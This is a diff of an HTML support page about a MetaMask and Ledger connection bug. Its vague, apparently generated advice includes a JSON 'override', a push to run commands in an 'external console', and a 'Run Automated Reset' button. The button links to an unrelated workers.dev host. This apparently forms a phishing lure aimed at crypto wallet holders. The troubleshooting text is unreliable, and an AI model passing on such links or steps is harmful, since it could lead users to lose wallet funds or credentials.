@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,18 +42,18 @@
 <h1>Metamask Extension Bug Ledger If Blind Signing Is Disabled Reco</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an issue with the Metamask extension when using a Ledger device, where the extension fails to function properly if blind signing is disabled, resulting in a requirement to reconnect from the beginning of the workflow.</li>
+<li>Users encounter an error when attempting to connect their Ledger device to Metamask, specifically after disabling blind signing, resulting in a prompt to reconnect from the beginning of the workflow.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a compatibility issue between the Metamask extension and the Ledger device when blind signing is disabled, causing a disruption in the expected workflow.</li>
+<li>The error occurs due to a bug in the Metamask extension that fails to handle the scenario where blind signing is disabled on the Ledger device, leading to a connection issue.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Enable blind signing on the Ledger device to restore compatibility with the Metamask extension.</li>
-<li>Update the Metamask extension to the latest version, which may include fixes for the compatibility issue.</li>
-<li>Use the following JSON configuration to override the default settings:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Enable blind signing on the Ledger device and then disable it again to restart the connection process.</li>
+<li>Update the Metamask extension to the latest version to ensure any bug fixes are applied.</li>
+<li>Use the following JSON configuration to manually configure the connection settings:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;ledger&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
@@ -62,14 +62,14 @@
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and configuration.</p>
+<p>Consider using an external console to execute these commands for a more streamlined experience.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
 <li>Ledger device connected and set up</li>
 <li>Blind signing disabled on the Ledger device</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
